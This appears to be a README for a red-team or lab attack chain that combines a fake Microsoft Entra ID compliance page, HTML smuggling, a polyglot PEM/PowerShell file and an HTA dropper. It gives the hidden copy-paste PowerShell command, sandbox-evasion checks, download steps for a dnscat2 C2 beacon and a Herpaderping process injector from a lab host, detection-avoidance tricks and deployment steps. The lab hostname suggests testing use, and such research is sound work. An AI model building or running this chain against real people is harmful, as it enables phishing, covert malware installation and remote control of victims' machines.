# malicious-copy-paste-combined

A complete exploit chain combining a fake corporate login lure, HTML smuggling, and an HTA dropper to install a C2 agent on the victim machine via a copy-paste interaction.

---

## Attack Chain Overview

```
[Victim visits staging.html]
        │
        ▼
[Browser silently reconstructs cert_bundle.txt from embedded data and saves to Downloads/]
        │
        ▼
[Victim copies the Win+R command → pastes → Enter]
        │
        ▼
[PowerShell decodes cert_bundle.txt → drops hpsolutionsportal.hta into %TEMP%]
        │
        ▼
[mshta.exe executes stage1.hta]
        │
        ├─ Downloads dnscat2.exe → C:\ProgramData\CertCA.bin
        ├─ Downloads CWLHerpaderping.exe → %APPDATA%\...\CertEnrollAgent.bin → renamed .exe
        └─ Runs CertEnrollAgent.exe → ghost process injection → C2 beacon active
```

---

## Files

### `staging.html` — Lure page

Impersonates a **Microsoft Entra ID** certificate compliance page. When the victim opens it:

1. Displays a spinner reading "Checking device compliance status..." for 5 seconds.
2. During that delay, the page checks several environment conditions — screen resolution, number of browser plugins, and timezone. If any check fails (sandbox, VM, small screen, UTC timezone), the page silently redirects to `login.microsoftonline.com`.
3. After 5 seconds, the page assembles `cert_bundle.txt` entirely from data embedded in the HTML and triggers a download to the victim's `Downloads/` folder — **no additional HTTP request is made to the server**.
4. The UI reveals a two-step instruction card: step 1 confirms the file was downloaded, step 2 presents a **Copy command** button.
5. Clicking the button (and a silent preload the moment the UI appears) places the following command into the clipboard:
   ```
   powershell -w h -ep bypass -c "iex(gc -Raw '%USERPROFILE%\Downloads\cert_bundle.txt')"
   ```
   The victim is instructed to press Win+R, paste, and hit Enter.

> The page only operates when `window.location.hostname === 'upload.testlab.local'`. Any other hostname causes an immediate redirect before any content is shown.

---

### `cert_bundle.txt` — Polyglot PEM / PowerShell script

The file looks like an ordinary PEM certificate bundle:

```
-----BEGIN CERTIFICATE-----
PHhtbCBoZWFkPjxIVEE6QVBQTELJQ...
(base64 lines)
-----END CERTIFICATE-----
```

It is actually a **polyglot file**. The PEM header and footer are wrapped inside a PowerShell block comment (`<# ... #>`), so PowerShell ignores them entirely and only executes the script below:

- Reads itself back from `Downloads\cert_bundle.txt`.
- Filters lines that are purely base64 characters (the content between the PEM delimiters).
- Decodes those lines into the raw bytes of `stage1.hta`.
- Writes the bytes to `%TEMP%\hpsolutionsportal.bin`, then renames it to `hpsolutionsportal.hta`.
- Launches `mshta.exe` against the dropped HTA.

This file is **automatically embedded into `staging.html`** every time `encode-command.py` is run — it does not need to be hosted separately on the server.

---

### `stage1.hta` — HTA dropper

Executed silently by `mshta.exe`. Displays a minimal "Windows Certificate Enrollment" window and closes itself after 5 seconds. All logic runs inside `Window_OnLoad`:

**Step 1 — Fetch the C2 beacon:**
- Sends a GET request to `http://upload.testlab.local/uploads/dnscat2.exe`.
- Saves the binary to `C:\ProgramData\CertCA.bin`.

**Step 2 — Fetch the process injector:**
- Sends a GET request to `http://upload.testlab.local/uploads/CWLHerpaderping.exe` (retries up to 3 times).
- Saves to `%APPDATA%\Microsoft\Windows\CertEnrollAgent.bin`.
- Renames it to `CertEnrollAgent.exe` — writing as `.bin` first avoids write-time detection triggers on `.exe` files.

**Step 3 — Execute:**
- Calls `Shell.Application.ShellExecute` with a hidden window to run `CertEnrollAgent.exe`.
- `CertEnrollAgent.exe` (CWLHerpaderping) reads `C:\ProgramData\CertCA.bin`, deletes it, then injects the beacon into a ghost process masquerading as `RuntimeBroker.exe`.

---

### `encode-command.py` — Build script

Run once before deployment to synchronize the entire chain:

```
python encode-command.py
```

Performs the following steps in order:

1. Reads `stage1.hta` and base64-encodes it.
2. Produces `cert_bundle.txt` as a polyglot file (PEM wrapper + base64 payload + inline PS decoder).
3. Base64-encodes the full content of `cert_bundle.txt`.
4. Injects that string into `staging.html` by replacing the `var b64 = '...'` assignment inside `triggerDownload()`.
5. Prints the Win+R command to stdout.

After running, only `staging.html` needs to be uploaded to the server — `cert_bundle.txt` is already embedded inside it.

---

## Server requirements

Upload the following files to `http://upload.testlab.local/uploads/`:

| File | Description |
|------|-------------|
| `dnscat2.exe` | C2 beacon (dnscat2 client) |
| `CWLHerpaderping.exe` | Process injector — built from `payloads/CWLHerpaderping/` with `CustomPayloadPath="C:\\ProgramData\\CertCA.bin"` |
| `staging.html` | Lure page (generated by `encode-command.py`) |

> `cert_bundle.txt` does **not** need to be uploaded — it is embedded inside `staging.html`.

---

## Rebuilding after payload changes

Whenever `stage1.hta` is modified, re-run `encode-command.py` to regenerate `cert_bundle.txt` and re-inject it into `staging.html`, then re-upload `staging.html`.
